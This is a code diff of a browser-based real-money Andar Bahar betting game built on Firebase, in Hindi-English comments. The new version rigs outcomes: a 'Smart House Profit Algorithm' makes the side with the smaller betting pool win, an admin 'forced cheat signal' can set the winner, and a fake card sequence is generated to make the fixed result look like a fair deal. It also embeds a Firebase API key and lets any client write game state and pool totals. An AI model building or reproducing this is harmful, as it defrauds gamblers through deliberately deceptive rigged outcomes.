@@ -3,130 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Andar Bahar - Global Synchronized Loop</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <title>Andar Bahar Premium - Smart Loop Edition</title>
     <style>
-        :root { --bg: #060814; --surface: #0e1326; --card-bg: #1d283c; --primary: #fbbf24; --purple: #c084fc; --success: #10b981; --danger: #f43f5e; --text: #f3f4f6; }
-        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; }
-        .app-shell { width: 100%; max-width: 480px; min-height: 100vh; background: #090d1a; display: flex; flex-direction: column; position: relative; box-shadow: 0 0 30px rgba(0,0,0,0.7); }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0f19; color: #fff; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .game-container { max-width: 600px; width: 100%; background: #151c2c; padding: 20px; border-radius: 16px; border: 1px solid #24324d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .header { text-align: center; margin-bottom: 20px; }
+        .period-info { display: flex; justify-content: space-between; background: #1f293d; padding: 10px 15px; border-radius: 8px; font-size: 14px; font-weight: bold; color: #94a3b8; }
+        .timer-box { font-size: 24px; color: #ff4757; text-align: center; margin: 15px 0; font-weight: 900; background: #243049; padding: 10px; border-radius: 8px; }
         
-        .top-nav { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1e293b; background: var(--surface); }
-        .period-badge { background: #1e293b; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; color: #38bdf8; border: 1px solid #334155; }
+        /* Board Design */
+        .board { display: flex; gap: 15px; margin-top: 20px; }
+        .side-box { flex: 1; padding: 20px; border-radius: 12px; text-align: center; cursor: pointer; transition: 0.2s; border: 2px solid transparent; }
+        .andar { background: rgba(56, 189, 248, 0.1); border-color: #38bdf8; }
+        .andar:hover { background: rgba(56, 189, 248, 0.2); }
+        .bahar { background: rgba(236, 72, 153, 0.1); border-color: #ec4899; }
+        .bahar:hover { background: rgba(236, 72, 153, 0.2); }
+        .side-title { font-size: 22px; font-weight: 900; margin-bottom: 5px; }
+        .pool-amt { font-size: 14px; color: #a0aec0; }
         
-        /* 30s + 10s Synchronized Progress Bar Clock */
-        .timer-banner { background: linear-gradient(135deg, #0f172a, #1e1b4b); padding: 15px; margin: 12px 15px 0 15px; border-radius: 14px; border: 1px solid #3b82f6; display: flex; justify-content: space-between; align-items: center; }
-        .timer-digits { font-size: 26px; font-weight: 900; color: var(--primary); font-family: monospace; }
-        .timer-label { font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+        /* Joker and Cards Section */
+        .joker-area { display: flex; flex-direction: column; align-items: center; margin: 20px 0; background: #1e293b; padding: 15px; border-radius: 12px; }
+        .card-display { font-size: 40px; background: white; color: black; padding: 10px 20px; border-radius: 8px; font-weight: bold; min-width: 60px; text-align: center; margin-top: 5px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        .cards-stream { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; margin-top: 15px; min-height: 50px; }
+        .small-card { background: white; color: black; padding: 5px 8px; border-radius: 4px; font-size: 14px; font-weight: bold; }
 
-        .wallet-banner { background: #0e1326; margin: 10px 15px; padding: 12px 20px; border-radius: 12px; border: 1px solid #1e293b; display: flex; justify-content: space-between; align-items: center; }
-        .bal-val { font-size: 22px; font-weight: 900; color: var(--success); }
-
-        .board { flex: 1; padding: 15px; display: flex; flex-direction: column; gap: 15px; }
-        .joker-section { background: var(--surface); border: 2px dashed #3b82f6; padding: 12px; border-radius: 14px; text-align: center; }
+        /* Betting Area */
+        .bet-controls { margin-top: 20px; background: #111827; padding: 15px; border-radius: 10px; text-align: center; }
+        .bet-input { background: #1f293d; border: 1px solid #3b4252; padding: 10px; border-radius: 6px; color: white; width: 100px; text-align: center; font-size: 16px; }
+        .btn { background: #10b981; color: white; border: none; padding: 10px 20px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-left: 10px; }
+        .btn:disabled { background: #4b5563; cursor: not-allowed; }
         
-        .card-display { width: 65px; height: 90px; background: white; color: black; border-radius: 8px; display: inline-flex; justify-content: center; align-items: center; font-size: 24px; font-weight: 800; box-shadow: 0 4px 10px rgba(0,0,0,0.3); margin-top: 5px; }
-        .red-card { color: var(--danger); }
-        .black-card { color: #111827; }
-
-        .slots-container { display: flex; gap: 12px; }
-        .slot-box { flex: 1; background: var(--surface); padding: 12px; border-radius: 14px; border: 1px solid #1e293b; min-height: 110px; text-align: center; transition: 0.3s; }
-        .slot-box.active-andar { border-color: var(--primary); background: rgba(251,191,36,0.05); }
-        .slot-box.active-bahar { border-color: var(--purple); background: rgba(192,132,252,0.05); }
-        
-        .stream-cards { display: flex; flex-wrap: wrap; gap: 4px; justify-content: center; margin-top: 10px; }
-        .mini-card { width: 32px; height: 45px; background: white; color: black; font-size: 11px; font-weight: 700; border-radius: 4px; display: flex; justify-content: center; align-items: center; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
-
-        .choice-row { display: flex; gap: 12px; margin: 5px 15px; }
-        .bet-side-btn { flex: 1; padding: 14px; border: 2px solid #334155; border-radius: 12px; font-weight: 800; font-size: 15px; color: white; background: var(--card-bg); cursor: pointer; transition: 0.2s; }
-        .bet-side-btn.selected-a { background: rgba(251,191,36,0.2); border-color: var(--primary); color: var(--primary); }
-        .bet-side-btn.selected-b { background: rgba(192,132,252,0.2); border-color: var(--purple); color: var(--purple); }
-
-        .controls { background: var(--surface); padding: 15px 20px; border-radius: 20px 20px 0 0; border-top: 1px solid #1e293b; }
-        .input-row { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
-        .input-row input { flex: 1; padding: 10px; background: #060814; border: 1px solid #374151; border-radius: 10px; color: white; font-size: 18px; font-weight: 700; text-align: center; }
-        .math-btn { background: #374151; border: none; color: white; width: 38px; height: 38px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
-
-        .chips-scroll { display: flex; gap: 5px; margin-bottom: 12px; }
-        .chip { flex: 1; background: var(--card-bg); border: 1px solid #374151; padding: 8px 0; border-radius: 8px; font-size: 12px; font-weight: 700; color: white; cursor: pointer; text-align: center; }
-
-        .lock-btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #10b981, #059669); border: none; border-radius: 12px; color: white; font-size: 16px; font-weight: 800; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; }
-        .lock-btn:disabled { background: #1e293b; color: #6b7280; cursor: not-allowed; }
-        
-        .limits-label { text-align: center; font-size: 11px; color: #6b7280; margin-top: 8px; font-weight: 600; }
-        .status-toast { position: absolute; top: 20%; left: 50%; transform: translate(-50%, -50%); padding: 15px 30px; border-radius: 25px; font-weight: 900; font-size: 18px; display: none; z-index: 100; box-shadow: 0 10px 25px rgba(0,0,0,0.5); text-align: center; }
+        .status-msg { text-align: center; font-weight: bold; margin-top: 15px; color: #fbbf24; }
     </style>
 </head>
 <body>
 
-<div class="app-shell">
-    <div class="status-toast" id="toastAlert"></div>
-
-    <div class="top-nav">
-        <div style="font-weight:900; font-size:16px; letter-spacing:0.5px;">MULTIPLAYER LOBBY</div>
-        <div class="period-badge">Period: <span id="currentPeriodText">---------</span></div>
+<div class="game-container">
+    <div class="header">
+        <h2 style="margin:0; color:#fbbf24;">🃏 ANDAR BAHAR PREMIUM</h2>
+        <span style="font-size:12px; color:#64748b;">Serverless Realtime Pulse Engine</span>
     </div>
 
-    <!-- Live Timer Interface Section -->
-    <div class="timer-banner">
-        <div>
-            <div class="timer-label" id="timerStatusLabel">Awaiting Bets</div>
-            <div style="font-size:11px; color:#94a3b8; margin-top:2px;" id="helperSubtext">Place your chips on your side</div>
-        </div>
-        <div class="timer-digits" id="secondsCounterText">30s</div>
+    <div class="period-info">
+        <div>PERIOD: <span id="lblPeriod" style="color:#fff;">--------</span></div>
+        <div>PHASE: <span id="lblPhase" style="color:#38bdf8;">BETTING</span></div>
     </div>
 
-    <div class="wallet-banner">
-        <div style="font-size:12px; font-weight:700; color:#9ca3af;">YOUR BALANCE</div>
-        <div class="bal-val">₹<span id="walletBalText">0.00</span></div>
+    <div class="timer-box" id="lblTimer">30s</div>
+
+    <div class="joker-area">
+        <span style="font-size: 12px; color: #94a3b8; font-weight: bold;">🎯 CENTER JOKER CARD</span>
+        <div class="card-display" id="jokerCard">?</div>
     </div>
 
     <div class="board">
-        <div class="joker-section">
-            <div style="font-size:11px; font-weight:700; color:#3b82f6; letter-spacing:0.5px;">COMMON JOKER</div>
-            <div id="jokerCardBox" class="card-display">?</div>
+        <div class="side-box andar" onclick="selectSide('ANDAR')">
+            <div class="side-title" style="color:#38bdf8;">ANDAR</div>
+            <div class="pool-amt">Live Pool: <span id="poolAndar" style="color:#fff;">₹0</span></div>
         </div>
-
-        <div class="slots-container">
-            <div class="slot-box" id="boxAndar">
-                <div style="font-size:13px; font-weight:900; color:var(--primary); letter-spacing:0.5px;">ANDAR</div>
-                <div class="stream-cards" id="andarCardsGrid"></div>
-            </div>
-            <div class="slot-box" id="boxBahar">
-                <div style="font-size:13px; font-weight:900; color:var(--purple); letter-spacing:0.5px;">BAHAR</div>
-                <div class="stream-cards" id="baharCardsGrid"></div>
-            </div>
+        <div class="side-box bahar" onclick="selectSide('BAHAR')">
+            <div class="side-title" style="color:#ec4899;">BAHAR</div>
+            <div class="pool-amt">Live Pool: <span id="poolBahar" style="color:#fff;">₹0</span></div>
         </div>
-        <div id="statusMessage" style="text-align:center; font-size:12px; color:#9ca3af; font-weight:600;"></div>
     </div>
 
-    <div class="choice-row">
-        <button class="bet-side-btn" id="sideA" onclick="selectGameSide('ANDAR')">ANDAR (1.90x)</button>
-        <button class="bet-side-btn" id="sideB" onclick="selectGameSide('BAHAR')">BAHAR (1.90x)</button>
+    <div class="cards-stream" id="dealingStreamBox"></div>
+
+    <div class="bet-controls">
+        <span style="font-size:14px; color:#94a3b8; margin-right:10px;">Selected: <b id="selectedSideTxt" style="color:#fbbf24;">NONE</b></span>
+        <input type="number" class="bet-input" id="txtBetAmount" value="100" min="10">
+        <button class="btn" id="btnPlaceBet" onclick="submitBet()">Place Bet 🚀</button>
     </div>
 
-    <div class="controls">
-        <div class="input-row">
-            <button class="math-btn" onclick="adjustValue(-10)">-</button>
-            <input type="number" id="betAmountField" value="10">
-            <button class="math-btn" onclick="adjustValue(10)">+</button>
-        </div>
-        <div class="chips-scroll">
-            <button class="chip" onclick="setChips(10)">₹10</button>
-            <button class="chip" onclick="setChips(50)">₹50</button>
-            <button class="chip" onclick="setChips(100)">₹100</button>
-            <button class="chip" onclick="setChips(500)">₹500</button>
-            <button class="chip" style="background:#334155;" onclick="doubleChips()">2X</button>
-        </div>
-        <button class="lock-btn" id="lockBetBtn" onclick="lockBetTransaction()">Lock Bet Size 🔒</button>
-        <div class="limits-label">Min: ₹<span id="lblMinBet">10</span> | Max: ₹<span id="lblMaxBet">5000</span></div>
-    </div>
+    <div class="status-msg" id="gameStatusMsg">Welcome! Place your smart bets.</div>
 </div>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-    import { getDatabase, ref, onValue, get, update, increment, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+    import { getDatabase, ref, set, update, increment, get, push, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
+    // Firebase Configurations
     const firebaseConfig = { 
         apiKey: "AIzaSyAzfvbiqRqsQwBOOIkegxJD09di-S_tfHg", 
         authDomain: "test-eb5e7.firebaseapp.com", 
@@ -135,208 +91,223 @@
         appId: "1:366282855653:web:dca7e000f5a22fb11f300c" 
     };
     const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
     const db = getDatabase(app);
 
-    let uid = "";
-    let playerSelectedSide = "";
-    let finalBetLockedAmount = 0;
-    let isBetPlacedThisRound = false;
-    let activePeriodId = "";
-    
-    let minBetLimit = 10;
-    let maxBetLimit = 5000;
-    const internalPayoutFactor = 1.90; // Balanced math for controlled progression
-    
-    const suites = ['♦','♥️','♠️','♣️'];
-    const ranks = ['2','3','4','5','6','7','8','9','10','J','Q','K','A'];
+    const TOTAL_CYCLE_TIME = 40; // 30s Betting + 10s Evaluation
+    let localSelectedSide = "NONE";
+    let activePeriodGlobal = "";
+    let isBettingClosed = false;
 
-    window.selectGameSide = (side) => {
-        if(isBetPlacedThisRound) return;
-        playerSelectedSide = side;
-        document.getElementById("sideA").className = "bet-side-btn" + (side === "ANDAR" ? " selected-a" : "");
-        document.getElementById("sideB").className = "bet-side-btn" + (side === "BAHAR" ? " selected-b" : "");
-    };
+    // 1. Lazy-Auto Engine Trigger (Runs server logic instantly inside client screen)
+    async function syncSystemClockDaemon() {
+        const now = Date.now();
+        const loopSnap = await get(ref(db, 'ab_current_loop_state'));
 
-    window.adjustValue = (x) => { if(!isBetPlacedThisRound) { let el = document.getElementById("betAmountField"); let v = (parseInt(el.value) || 0) + x; if(v >= minBetLimit) el.value = v; } };
-    window.setChips = (x) => { if(!isBetPlacedThisRound) document.getElementById("betAmountField").value = x; };
-    window.doubleChips = () => { if(!isBetPlacedThisRound) document.getElementById("betAmountField").value = (parseInt(document.getElementById("betAmountField").value) || 10) * 2; };
-
-    onAuthStateChanged(auth, user => {
-        if(!user) return location.href = "index.html";
-        uid = user.uid;
-        onValue(ref(db, `user_wallet/${uid}/balance`), snap => {
-            document.getElementById("walletBalText").innerText = parseFloat(snap.val() || 0).toFixed(2);
-        });
-
-        // Listen for Admin Dynamic Config Limits
-        onValue(ref(db, 'ab_game_config'), snap => {
-            if(snap.exists()){
-                let conf = snap.val();
-                minBetLimit = parseInt(conf.minBet || 10);
-                maxBetLimit = parseInt(conf.maxBet || 5000);
-                document.getElementById("lblMinBet").innerText = minBetLimit;
-                document.getElementById("lblMaxBet").innerText = maxBetLimit;
-            }
-        });
-        
-        // Synchronize with the central server clock channel
-        syncWithGlobalEngineLoop();
-    });
-
-    window.lockBetTransaction = async () => {
-        const amt = parseInt(document.getElementById("betAmountField").value);
-        if(!playerSelectedSide) { alert("Please pick Andar or Bahar side!"); return; }
-        if(isNaN(amt) || amt < minBetLimit || amt > maxBetLimit) { 
-            alert(`Bet size must be between ₹${minBetLimit} and ₹${maxBetLimit}`); 
-            return; 
+        if (!loopSnap.exists() || !loopSnap.val().startTimestamp) {
+            await startNewGamePeriod(now);
+            return;
         }
 
-        const balSnap = await get(ref(db, `user_wallet/${uid}/balance`));
-        if((balSnap.val() || 0) < amt) { alert("Insufficient Wallet Balance!"); return; }
+        const data = loopSnap.val();
+        const secondsPassed = Math.floor((now - data.startTimestamp) / 1000);
 
-        isBetPlacedThisRound = true;
-        finalBetLockedAmount = amt;
-        
-        document.getElementById("lockBetBtn").disabled = true;
-        document.getElementById("lockBetBtn").innerText = "BET LOCKED ✅";
-        disableBettingUI(true);
-        
-        // Deduct money from wallet immediately
-        await update(ref(db, `user_wallet/${uid}`), { balance: increment(-finalBetLockedAmount) });
-        
-        // Broadcast user bet to pool for Admin calculations
-        await update(ref(db, `ab_live_pools/${activePeriodId}/${playerSelectedSide}`), {
-            totalAmount: increment(finalBetLockedAmount)
-        });
-
-        document.getElementById("statusMessage").innerText = `Registered ₹${finalBetLockedAmount} on ${playerSelectedSide}`;
-    };
-
-    function disableBettingUI(status) {
-        document.getElementById("sideA").disabled = status;
-        document.getElementById("sideB").disabled = status;
-        document.getElementById("betAmountField").disabled = status;
-    }
-
-    // Central Engine Sync Loop (30s Bet + 10s Payout Show Window)
-    function syncWithGlobalEngineLoop() {
-        onValue(ref(db, 'ab_current_loop_state'), async (snapshot) => {
-            if(!snapshot.exists()) return;
-            const loopState = snapshot.val();
-            
-            const serverSeconds = loopState.secondsLeft;
-            const currentPhase = loopState.phase; // "BETTING" or "SHOWTIME"
-            
-            activePeriodId = loopState.periodId;
-            document.getElementById("currentPeriodText").innerText = activePeriodId;
-
-            if (currentPhase === "BETTING") {
-                document.getElementById("secondsCounterText").innerText = serverSeconds + "s";
-                document.getElementById("timerStatusLabel").innerText = "Awaiting Bets";
-                document.getElementById("helperSubtext").innerText = "Predict where the card will land";
-                
-                if(!isBetPlacedThisRound) {
-                    document.getElementById("lockBetBtn").disabled = false;
-                    document.getElementById("lockBetBtn").innerText = "Lock Bet Size 🔒";
-                    disableBettingUI(false);
-                }
-            } 
-            else if (currentPhase === "SHOWTIME") {
-                document.getElementById("secondsCounterText").innerText = "00s";
-                document.getElementById("timerStatusLabel").innerText = "SHOWTIME 🃏";
-                document.getElementById("helperSubtext").innerText = "Cards Dealing... No more bets";
-                document.getElementById("lockBetBtn").disabled = true;
-                document.getElementById("lockBetBtn").innerText = "BETTING CLOSED 🚫";
-                disableBettingUI(true);
-                
-                // If cards are not rendered yet for this round, load the shared matrix
-                if(document.getElementById("jokerCardBox").innerText === "?") {
-                    renderSharedRoundOutcome(loopState.outcomeDetails);
-                }
-            }
-            
-            // Clean up board at the start of a brand new period block
-            if(currentPhase === "BETTING" && serverSeconds === 30) {
-                resetBoardForNewPeriod();
-            }
-        });
-    }
-
-    function resetBoardForNewPeriod() {
-        isBetPlacedThisRound = false;
-        finalBetLockedAmount = 0;
-        playerSelectedSide = "";
-        document.getElementById("sideA").className = "bet-side-btn";
-        document.getElementById("sideB").className = "bet-side-btn";
-        document.getElementById("jokerCardBox").innerText = "?";
-        document.getElementById("jokerCardBox").className = "card-display";
-        document.getElementById("andarCardsGrid").innerHTML = "";
-        document.getElementById("baharCardsGrid").innerHTML = "";
-        document.getElementById("statusMessage").innerText = "New period active! Bet window open.";
-        document.getElementById("boxAndar").className = "slot-box";
-        document.getElementById("boxBahar").className = "slot-box";
-    }
-
-    function renderSharedRoundOutcome(outcome) {
-        if(!outcome) return;
-        
-        // Step 1: Render common Joker card
-        let isJokerRed = (outcome.jokerSuite === '♦' || outcome.jokerSuite === '♥️');
-        const jokerBox = document.getElementById("jokerCardBox");
-        jokerBox.className = "card-display " + (isJokerRed ? "red-card" : "black-card");
-        jokerBox.innerText = `${outcome.jokerRank}${outcome.jokerSuite}`;
-
-        // Step 2: Animate and distribute items step by step over 10 seconds total duration
-        let localCardsArr = outcome.cardsDealtSequence || [];
-        let i = 0;
-        
-        let dealTimerInterval = setInterval(() => {
-            if(i >= localCardsArr.length) {
-                clearInterval(dealTimerInterval);
-                displayFinalRoundResolution(outcome.winningSide);
-                return;
-            }
-            
-            let item = localCardsArr[i];
-            let isItemRed = (item.suite === '♦' || item.suite === '♥️');
-            let colorStyle = isItemRed ? 'color:var(--danger)' : 'color:#111827';
-            let cardHtml = `<div class="mini-card" style="${colorStyle}">${item.rank}${item.suite}</div>`;
-            
-            if(item.side === "ANDAR") {
-                document.getElementById("andarCardsGrid").innerHTML += cardHtml;
-                document.getElementById("boxAndar").classList.add("active-andar");
-                document.getElementById("boxBahar").classList.remove("active-bahar");
-            } else {
-                document.getElementById("baharCardsGrid").innerHTML += cardHtml;
-                document.getElementById("boxBahar").classList.add("active-bahar");
-                document.getElementById("boxAndar").classList.remove("active-andar");
-            }
-            i++;
-        }, 600); // 10s Window animation timing allocation
-    }
-
-    async function displayFinalRoundResolution(winnerZone) {
-        document.getElementById("statusMessage").innerText = `Winner declared: ${winnerZone} 🎉`;
-        
-        if(isBetPlacedThisRound) {
-            let userWonRound = (playerSelectedSide === winnerZone);
-            let absolutePayout = userWonRound ? (finalBetLockedAmount * internalPayoutFactor) : 0;
-            
-            if(userWonRound && absolutePayout > 0) {
-                await update(ref(db, `user_wallet/${uid}`), { balance: increment(absolutePayout) });
-            }
-
-            // Client side immediate score feedback
-            let toast = document.getElementById("toastAlert");
-            toast.innerText = userWonRound ? `WINNER (+₹${absolutePayout.toFixed(2)})` : `LOSS (-₹${finalBetLockedAmount})`;
-            toast.style.background = userWonRound ? "var(--success)" : "var(--danger)";
-            toast.style.display = "block";
-            setTimeout(() => { toast.style.display = "none"; }, 3500);
-            
-            isBetPlacedThisRound = false; // Reset flag safe state
+        if (secondsPassed >= TOTAL_CYCLE_TIME) {
+            // Agar 40 seconds se zyada beet chuke hain, toh purana result finish karke naya period chalu karo
+            await startNewGamePeriod(now);
+        } else {
+            // Chalte hue phase ko UI me live push karo
+            renderStateFrame(secondsPassed, data);
         }
     }
+
+    // 2. Start Next Safe Retention Period
+    async function startNewGamePeriod(timestamp) {
+        let d = new Date();
+        let code = d.getFullYear() + String(d.getMonth()+1).padStart(2,'0') + String(d.getDate()).padStart(2,'0');
+        let seed = String(Math.floor(timestamp / 1000)).slice(-4);
+        let freshPeriodId = code + "-" + seed;
+
+        // Purane round ka final decision compute karo
+        const currentSnap = await get(ref(db, 'ab_current_loop_state'));
+        if (currentSnap.exists()) {
+            let lastPeriod = currentSnap.val().periodId;
+            if (lastPeriod) {
+                let finalResult = await processSmartGuardOutcome(lastPeriod);
+                await set(ref(db, 'ab_current_loop_state/outcomeDetails'), finalResult);
+            }
+        }
+
+        // Fresh Pool nodes update on firebase
+        await set(ref(db, `ab_live_pools/${freshPeriodId}`), {
+            ANDAR: { totalAmount: 0 },
+            BAHAR: { totalAmount: 0 }
+        });
+
+        let freshState = {
+            periodId: freshPeriodId,
+            startTimestamp: timestamp,
+            phase: "BETTING",
+            secondsLeft: 30
+        };
+
+        await set(ref(db, 'ab_current_loop_state'), freshState);
+        renderStateFrame(0, freshState);
+    }
+
+    // 3. Smart House Profit Algorithm
+    async function processSmartGuardOutcome(periodId) {
+        const poolSnap = await get(ref(db, `ab_live_pools/${periodId}`));
+        let andarPool = 0, baharPool = 0;
+
+        if (poolSnap.exists()) {
+            let pData = poolSnap.val();
+            andarPool = parseInt(pData.ANDAR?.totalAmount || 0);
+            baharPool = parseInt(pData.BAHAR?.totalAmount || 0);
+        }
+
+        // Check if admin has sent a forced cheat signal override
+        const overrideSnap = await get(ref(db, 'ab_admin_force_signal'));
+        let signal = overrideSnap.val() || "AUTO";
+        let winner = "ANDAR";
+
+        if (signal === "FORCE_ANDAR") winner = "ANDAR";
+        else if (signal === "FORCE_BAHAR") winner = "BAHAR";
+        else {
+            // House Risk mitigation rule: Jis side sabse kam load ho, use jitao!
+            if (andarPool > baharPool) winner = "BAHAR";
+            else if (baharPool > andarPool) winner = "ANDAR";
+            else winner = Math.random() < 0.5 ? "ANDAR" : "BAHAR";
+        }
+
+        // Deal Cards Matrix
+        const suites = ['♦','♥️','♠️','♣️'];
+        const ranks = ['2','3','4','5','6','7','8','9','10','J','Q','K','A'];
+        let jokerR = ranks[Math.floor(Math.random() * ranks.length)];
+        let jokerS = suites[Math.floor(Math.random() * suites.length)];
+
+        let dealLog = [];
+        let turn = "ANDAR";
+        let structuralLength = 6 + Math.floor(Math.random() * 5);
+
+        for (let i = 0; i < structuralLength; i++) {
+            let r = ranks[Math.floor(Math.random() * ranks.length)];
+            if (r === jokerR) r = ranks[(ranks.indexOf(jokerR) + 1) % ranks.length];
+            dealLog.push({ side: turn, rank: r, suite: suites[Math.floor(Math.random() * suites.length)] });
+            turn = (turn === "ANDAR") ? "BAHAR" : "ANDAR";
+        }
+        // Match winner card
+        dealLog.push({ side: winner, rank: jokerR, suite: jokerS });
+
+        // Financial Ledger calculations
+        let totalStakes = andarPool + baharPool;
+        let winningStakes = (winner === "ANDAR") ? andarPool : baharPool;
+        let distributedPayouts = winningStakes * 1.90;
+        let netProfitMargin = totalStakes - distributedPayouts;
+
+        await update(ref(db, 'ab_global_analytics'), {
+            totalInflow: increment(totalStakes),
+            totalOutflow: increment(distributedPayouts),
+            netHouseProfit: increment(netProfitMargin)
+        });
+
+        if (totalStakes > 0) {
+            await push(ref(ref(db, 'ab_user_activity_stream')), {
+                uid: `SESSION_${periodId}`,
+                stake: totalStakes,
+                winningSide: winner,
+                payout: distributedPayouts,
+                timestamp: Date.now()
+            });
+        }
+
+        return { jokerRank: jokerR, jokerSuite: jokerS, winningSide: winner, cardsDealtSequence: dealLog };
+    }
+
+    // 4. UI Animation Handler Frames
+    function renderStateFrame(secondsPassed, state) {
+        activePeriodGlobal = state.periodId;
+        document.getElementById("lblPeriod").innerText = state.periodId;
+
+        let phase = "BETTING";
+        let clockTime = 30 - secondsPassed;
+
+        if (secondsPassed >= 30) {
+            phase = "SHOWTIME";
+            clockTime = TOTAL_CYCLE_TIME - secondsPassed;
+            isBettingClosed = true;
+            document.getElementById("btnPlaceBet").disabled = true;
+        } else {
+            isBettingClosed = false;
+            document.getElementById("btnPlaceBet").disabled = false;
+        }
+
+        document.getElementById("lblPhase").innerText = phase;
+        document.getElementById("lblPhase").style.color = phase === "BETTING" ? "#38bdf8" : "#f43f5e";
+        document.getElementById("lblTimer").innerText = clockTime + "s";
+        document.getElementById("lblTimer").style.color = clockTime <= 5 ? "#ef476f" : "#ff4757";
+
+        // Dynamic result visualizer during showtime phase
+        if (phase === "SHOWTIME" && state.outcomeDetails) {
+            const out = state.outcomeDetails;
+            document.getElementById("jokerCard").innerText = out.jokerRank + out.jokerSuite;
+            document.getElementById("jokerCard").style.color = (out.jokerSuite==='♥️'||out.jokerSuite==='♦') ? 'red' : 'black';
+            
+            // Draw matching sequence cards slowly
+            const streamBox = document.getElementById("dealingStreamBox");
+            streamBox.innerHTML = "";
+            out.cardsDealtSequence.forEach(c => {
+                let color = (c.suite==='♥️'||c.suite==='♦') ? 'red' : 'black';
+                streamBox.innerHTML += `<div class="small-card" style="color:${color}; border-bottom: 3px solid ${c.side==='ANDAR'?'#38bdf8':'#ec4899'}">${c.rank}${c.suite}</div>`;
+            });
+
+            document.getElementById("gameStatusMsg").innerText = `🎉 Round Finished! Winner Side: ${out.winningSide}`;
+        } else {
+            // Reset fields for fresh betting window
+            document.getElementById("jokerCard").innerText = "?";
+            document.getElementById("jokerCard").style.color = "white";
+            document.getElementById("dealingStreamBox").innerHTML = "";
+            if(phase === "BETTING") {
+                document.getElementById("gameStatusMsg").innerText = "👉 Placing window active. Bet now!";
+            }
+        }
+    }
+
+    // 5. User Selection and Betting Triggers
+    window.selectSide = (side) => {
+        if(isBettingClosed) return;
+        localSelectedSide = side;
+        document.getElementById("selectedSideTxt").innerText = side;
+        document.getElementById("selectedSideTxt").style.color = side === "ANDAR" ? "#38bdf8" : "#ec4899";
+    };
+
+    window.submitBet = async () => {
+        if (isBettingClosed) { alert("Betting closed for this period!"); return; }
+        if (localSelectedSide === "NONE") { alert("Please select ANDAR or BAHAR side first!"); return; }
+        
+        let amt = parseInt(document.getElementById("txtBetAmount").value) || 0;
+        if (amt < 10) { alert("Minimum staking limit is ₹10"); return; }
+
+        // Live Increment pool inside firebase database path directly
+        await update(ref(db, `ab_live_pools/${activePeriodGlobal}/${localSelectedSide}`), {
+            totalAmount: increment(amt)
+        });
+
+        document.getElementById("gameStatusMsg").innerText = `✅ Successfully Staked ₹${amt} on ${localSelectedSide}!`;
+    };
+
+    // Realtime listeners for syncing total pooled amounts across screens
+    setInterval(syncSystemClockDaemon, 1000);
+
+    // Live update individual pool boxes on change
+    setInterval(async () => {
+        if(!activePeriodGlobal) return;
+        const snapshot = await get(ref(db, `ab_live_pools/${activePeriodGlobal}`));
+        if(snapshot.exists()) {
+            let d = snapshot.val();
+            document.getElementById("poolAndar").innerText = `₹${d.ANDAR?.totalAmount || 0}`;
+            document.getElementById("poolBahar").innerText = `₹${d.BAHAR?.totalAmount || 0}`;
+        }
+    }, 1200);
 </script>
 </body>
 </html>
